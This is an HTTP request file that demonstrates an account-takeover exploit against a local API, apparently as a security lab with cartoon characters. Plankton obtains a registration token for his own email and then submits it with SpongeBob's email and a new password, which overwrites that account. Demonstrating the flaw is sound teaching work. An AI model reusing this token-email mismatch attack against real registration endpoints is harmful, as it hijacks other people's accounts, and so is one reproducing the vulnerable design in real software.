@base = http://localhost:8000/api/v106

# SpongeBob accesses here order history
GET {{base}}/orders
Authorization: Basic spongebob@bikinibottom.sea:i_l0ve_burg3rs

### Plankton wants to hijack SpongeBob's account and tries to register as him
POST {{base}}/auth/register
Content-Type: application/json

{
    "email": "spongebob@bikinibottom.sea"
}

# But it fails:
# {
#   "message": "email already taken",
#   "status": "error"
# }

### So, Plankton registers his own sock puppet account instead
POST {{base}}/auth/register
Content-Type: application/json

{
    "email": "plankton.jr@chum-bucket.sea"
}

# This request succeeds and sends a verification email to provided email
# {
#   "email": "plankton.jr@chum-bucket.sea",
#   "status": "verification_email_sent"
# }

### Plankton COULD create his own user with this token:
#POST {{base}}/auth/register
#Content-Type: application/json
#
#{
#    "token": "...",
#    "email": "plankton.jr@chum-bucket.sea",
#    "password": "...",
#    "name": "Plankton Jr."
#}
#
# {
#   "email": "plankton.jr@chum-bucket.sea",
#   "status": "user_created"
# }

### But, instead he overwrites SpongeBob's account, hijacking it!
POST {{base}}/auth/register
Content-Type: application/json

{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBsYW5rdG9uLmpyQGNodW0tYnVja2V0LnNlYSIsImV4cCI6MTc2MzEzNjI0OX0.6fBlPx4qIU79iNpwIBEoa4FSg9SWkkuhNFkRo40IJ70",
    "email": "spongebob@bikinibottom.sea",
    "password": "hijacked",
    "name": "SpongeBob"
}

# The user is created successfully!
# {
#   "email": "spongebob@bikinibottom.sea",
#   "status": "user_created"
# }

### Now, Plankton can access SpongeBob's order history!
GET {{base}}/orders
Authorization: Basic spongebob@bikinibottom.sea:hijacked
